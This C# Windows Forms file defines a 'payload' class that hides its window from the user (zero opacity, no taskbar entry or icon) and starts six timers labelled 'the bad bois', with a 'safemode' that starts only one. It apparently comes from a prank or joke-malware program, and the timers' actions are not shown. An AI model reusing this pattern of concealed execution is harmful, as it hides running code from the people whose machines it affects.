﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

public class payload
{
    public static void pld(Form app, Timer timera, Timer timerb, Timer timerc, Timer timerd, Timer timere, Timer timerf, bool safemode)
    {
        app.Text = "LOLZ:R";
        app.ShowInTaskbar = false;
        app.ShowIcon = false;
        app.Opacity = 0;
        app.WindowState = FormWindowState.Normal;
        if (!safemode)
        {
            List<Timer> Timerlist = new List<Timer>() { timera, timerb, timerc, timerd, timere, timerf }; //the bad bois

            for (int i = 0; i < Timerlist.Count; i++)
            {
                Timerlist[i].Start();
            }
        }
        else
        {
            System.Windows.Forms.MessageBox.Show("safemode: " + safemode.ToString(), "safemode", MessageBoxButtons.OK, MessageBoxIcon.Information);
            List<Timer> Timerlist = new List<Timer>() { timerf }; //the bad bois

            for (int i = 0; i < Timerlist.Count; i++)
            {
                Timerlist[i].Start();
            }
        }
    }
}
